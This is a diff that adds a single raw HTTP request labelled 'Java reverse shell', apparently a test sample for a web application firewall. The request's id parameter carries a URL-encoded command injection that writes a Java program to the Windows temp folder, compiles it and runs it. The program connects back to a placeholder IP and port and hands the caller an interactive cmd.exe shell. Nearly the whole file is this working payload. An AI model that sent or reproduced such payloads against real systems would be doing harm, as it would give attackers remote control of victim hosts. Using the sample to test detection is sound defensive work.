@@ -1,0 +1,9 @@
+# 命令执行_反弹shell-06507069
+# Java反弹shell
+GET /?id=echo%20import%20java.io.InputStream%3Bimport%20java.io.OutputStream%3Bimport%20java.net.Socket%3Bpublic%20class%20winshell%7Bpublic%20static%20void%20main%28String%5B%5D%20args%29%20throws%20Exception%20%7BString%20host=%22%2A%7BIP%7D%22%3Bint%20port=%2A%7BPORT%7D%3BString%20cmd=%22cmd.exe%22%3BProcess%20p=new%20ProcessBuilder%28cmd%29.redirectErrorStream%28true%29.start%28%29%3BSocket%20s=new%20Socket%28host%2Cport%29%3BInputStream%20pi=p.getInputStream%28%29%2Cpe=p.getErrorStream%28%29%2C%20si=s.getInputStream%28%29%3BOutputStream%20po=p.getOutputStream%28%29%2Cso=s.getOutputStream%28%29%3Bwhile%28%21s.isClosed%28%29%29%7Bwhile%28pi.available%28%29%5E%3E0%29so.write%28pi.read%28%29%29%3Bwhile%28pe.available%28%29%5E%3E0%29so.write%28pe.read%28%29%29%3Bwhile%28si.available%28%29%5E%3E0%29po.write%28si.read%28%29%29%3Bso.flush%28%29%3Bpo.flush%28%29%3BThread.sleep%2850%29%3Btry%20%7Bp.exitValue%28%29%3Bbreak%3B%7Dcatch%20%28Exception%20e%29%7B%7D%7D%3Bp.destroy%28%29%3Bs.close%28%29%3B%7D%7D%3E%20%25temp%25%5Cwinshell.java%0Ajavac%20%25temp%25%5Cwinshell.java%20&&%20java%20-cp%20%25temp%25%5C%20winshell&bid=hd_tag_m8mv25z5 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25z5
+RM-PRO-Token: fc032646ac35669185f8486686a78661
+RM-PRO-Time: 1742808515500
+User-Agent: curl/7.83.1
+
